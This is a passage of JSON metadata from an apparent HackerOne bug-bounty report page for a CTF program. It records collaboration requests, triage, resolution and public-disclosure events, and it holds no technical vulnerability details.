sure_at":"2019-05-08T15:55:25.997Z","allow_singular_disclosure_after":-76633900.61642072,"singular_disclosure_allowed":true,"vote_count":8,"voters":["checkm50","bughunterninja","ali","realtess","armansameer","sheeemme","globalenigma","dsdroid"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4247729,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can you guys enabled the collaboration feature? I'd like to add @corb3nik as a collaborator...","automated_response":false,"created_at":"2019-03-03T18:05:36.093Z","updated_at":"2019-03-03T18:05:36.093Z","actor":{"username":"ret2jazzy","cleared":true,"url":"/ret2jazzy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/106/874/b65d946b97ff3d971a091fc805c27b72ef815dd7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4256908,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for sending in this report.  We'll close it and enable disclosure once the CTF has closed and all reports are in.\n\n(Also, I will enable collaboration tomorrow and make sure he can be added)","automated_response":false,"created_at":"2019-03-05T01:26:17.076Z","updated_at":"2019-03-05T01:26:17.076Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4270673,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great! When does the CTF close btw?","automated_response":false,"created_at":"2019-03-06T20:11:39.575Z","updated_at":"2019-03-06T20:11:39.575Z","actor":{"username":"ret2jazzy","cleared":true,"url":"/ret2jazzy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/106/874/b65d946b97ff3d971a091fc805c27b72ef815dd7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4303559,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @daeken, would you please enable collaboration so I can invite @corb3nik?","automated_response":false,"created_at":"2019-03-11T22:33:43.206Z","updated_at":"2019-03-11T22:33:43.206Z","actor":{"username":"ret2jazzy","cleared":true,"url":"/ret2jazzy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/106/874/b65d946b97ff3d971a091fc805c27b72ef815dd7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4492847,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for the amazing report! We'll be announcing the winners shortly, so we'll let you know if you're one of the reports selected. Going to close this and then request public disclosure now.","automated_response":false,"created_at":"2019-04-05T18:34:19.042Z","updated_at":"2019-04-05T18:34:19.042Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ret2jazzy","url":"/ret2jazzy"},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509089,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-04-08T15:55:25.955Z","updated_at":"2019-04-08T15:55:25.955Z","first_to_agree":true,"actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509090,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","automated_response":false,"created_at":"2019-04-08T15:55:34.145Z","updated_at":"2019-04-08T15:55:34.145Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}